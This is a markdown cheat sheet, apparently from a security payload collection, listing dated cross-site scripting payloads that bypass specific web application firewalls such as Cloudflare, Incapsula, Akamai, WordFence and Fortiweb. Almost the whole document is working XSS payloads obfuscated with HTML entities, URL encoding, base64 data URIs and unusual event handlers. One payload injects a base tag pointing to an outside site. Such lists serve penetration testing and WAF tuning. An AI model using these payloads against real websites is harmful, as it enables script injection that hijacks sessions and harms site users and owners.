# Common WAF Bypass

> WAFs are designed to filter out malicious content by inspecting incoming and outgoing traffic for patterns indicative of attacks. Despite their sophistication, WAFs often struggle to keep up with the diverse methods attackers use to obfuscate and modify their payloads to circumvent detection. 


## Summary

* [Cloudflare](#cloudflare)
* [Chrome Auditor](#chrome-auditor)
* [Incapsula WAF](#incapsula-waf)
* [Akamai WAF](#akamai-waf)
* [WordFence WAF](#wordfence-waf)
* [Fortiweb WAF](#fortiweb-waf)


## Cloudflare

* 25st January 2021 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)
    ```js
    <svg/onrandom=random onload=confirm(1)>
    <video onnull=null onmouseover=confirm(1)>
    ```

* 21st April 2020 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)
    ```js
    <svg/OnLoad="`${prompt``}`">
    ```

* 22nd August 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)
    ```js
    <svg/onload=%26nbsp;alert`bohdan`+
    ```

* 5th June 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)
    ```js
    1'"><img/src/onerror=.1|alert``>
    ```

* 3rd June 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)
    ```js
    <svg onload=prompt%26%230000000040document.domain)>
    <svg onload=prompt%26%23x000000028;document.domain)>
    xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
    ```

* 22nd March 2019 - @RakeshMane10
    ```js
    <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
    ```

* 27th February 2018
    ```html
    <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
    ```

## Chrome Auditor

NOTE: Chrome Auditor is deprecated and removed on latest version of Chrome and Chromium Browser.

* 9th August 2018
    ```javascript
    </script><svg><script>alert(1)-%26apos%3B
    ```


## Incapsula WAF

* 11th May 2019 - [@daveysec](https://twitter.com/daveysec/status/1126999990658670593)
    ```js
    <svg onload\r\n=$.globalEval("al"+"ert()");>
    ```

* 8th March 2018 - [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)
    ```javascript
    anythinglr00</script><script>alert(document.domain)</script>uxldz
    anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
    ```

* 11th September 2018 - [@c0d3G33k](https://twitter.com/c0d3G33k)
    ```javascript
    <object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
    ```


## Akamai WAF

* 18th June 2018 - [@zseano](https://twitter.com/zseano)
    ```javascript
    ?"></script><base%20c%3D=href%3Dhttps:\mysite>
    ```

* 28th October 2018 - [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480)
    ```svg
    <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
    ```


## WordFence WAF

* 12th September 2018 - [@brutelogic](https://twitter.com/brutelogic)
    ```html
    <a href=javas&#99;ript:alert(1)>
    ```

## Fortiweb WAF

* 9th July 2019 - [@rezaduty](https://twitter.com/rezaduty)
    ```javascript
    \u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
    ```